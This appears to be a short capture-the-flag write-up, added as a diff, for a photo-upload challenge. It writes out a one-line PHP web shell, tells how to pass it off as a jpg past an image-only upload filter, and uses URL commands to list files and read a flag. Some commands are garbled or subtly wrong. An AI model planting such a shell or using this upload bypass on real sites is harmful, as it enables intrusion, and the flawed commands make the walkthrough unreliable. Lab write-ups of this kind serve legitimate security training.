@@ -1,0 +1,23 @@
+First go to the site given 
+Here you can see nothing is possible at all except to upload photos
+This was a very simple challenge we needed to do a file inclusion atatck which would give us the ability to use command prompt from the 
+address bar.
+The upload button is restricted to accept image files.
+So we write a script
+
+...php begins here...
+
+echo '<?phpif($_GET){system($_GET["cmd"]);}?>'
+
+// Download an image of jpg format move that jpg to this php file and upload this file.
+
+...php ends here...
+
+After uploading you will be redirested to a page which says upload suceessful get the upload number from there.
+Go back to main page and to a traversal to /uploads/uploadnumber.php/
+This will give you bunch of gibberish
+Now do a /uploads/uploadnumber.php/cmd=ls ../
+This will list out few file names 
+In these file names you'll find one file called flag.txt
+Now to /uploads/uploadnumber.php/cmd=ls ../flag.txt | grep shellter
+This will give you the flag.
